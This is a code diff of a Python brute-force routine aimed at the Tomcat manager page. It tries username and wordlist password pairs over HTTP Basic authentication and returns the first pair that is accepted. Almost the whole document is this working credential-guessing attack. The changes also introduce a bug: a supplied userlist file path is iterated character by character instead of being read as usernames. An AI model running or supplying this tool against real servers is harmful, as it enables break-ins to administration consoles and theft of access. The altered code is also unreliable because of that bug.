@@ -36,50 +36,41 @@ common_username: list[str] = [
 ]
 
 
+# TODO : Make a class for output statement [+], [-], like output.success("description of the output")
+
 # Brute force mode function
 def brute(url: str, userlist: str, wordlist: str) -> tuple[str, str] | bool:
 
-    # without user list
     if userlist is None:
-        with open(wordlist, "r", encoding="utf-8", errors="ignore") as open_wordlist:
+        userlist = common_username
 
-            length_wordlist = len(open_wordlist.readlines())
+    # without user list
+    with open(wordlist, "r", encoding="utf-8", errors="ignore") as open_wordlist:
 
-            with Progress(*progress_bar.columns, transient=True) as progress:
-                task = progress.add_task(description="[violet] Brute force...",
-                                         total=length_wordlist*len(common_username))
+        length_wordlist = len(open_wordlist.readlines())
 
-                for username in common_username:
-                    # Reset file pointer
-                    open_wordlist.seek(0)
+        with Progress(*progress_bar.columns, transient=True) as progress:
+            task = progress.add_task(description="[violet] Brute force...",
+                                     total=length_wordlist * len(userlist))
 
-                    for password in open_wordlist:
-                        password = password.strip()  # remove space or bad space
-                        auth = HTTPBasicAuth(username, password)
-                        response = requests.get(f"{url}/manager/html", auth=auth)
+            for username in userlist:
+                # Reset file pointer to the beginning
+                open_wordlist.seek(0)
 
-                        # TODO : add an option --continue-on-success
-                        if response.status_code == 200:
-                            progress.update(task, completed=length_wordlist * len(common_username))
-                            time.sleep(1)
-                            return username, password
-                        else:
-                            progress.advance(task)
+                for password in open_wordlist:
+                    password = password.strip()  # remove space or bad space
+                    auth = HTTPBasicAuth(username, password)
+                    response = requests.get(f"{url}/manager/html", auth=auth)
 
-    # with user list
-    else:
-        with open(userlist, "r", encoding="utf-8", errors="ignore") as open_userlist:
-            with open(wordlist, "r", encoding="utf-8", errors="ignore") as open_wordlist:
-                for user in tqdm(open_userlist, desc="BrutForce Status"):
-                    user = user.strip()  # remove space or bad space
-                    open_wordlist.seek(0)  # go back on the file
-                    for password in open_wordlist:
-                        password = password.strip()  # remove space or bad space
-                        auth = HTTPBasicAuth(user, password)
-                        response = requests.get(f"{url}/manager/html", auth=auth)
-                        if response.status_code == 200 and 403:
-                            return user, password
+                    # TODO : add an option --continue-on-success
+                    if response.status_code == 200:
+                        progress.update(task, completed=length_wordlist * len(userlist))
+                        time.sleep(1)
+                        return username, password
+                    else:
+                        progress.advance(task)
 
+    # if not found return False statement
     return False
 
 
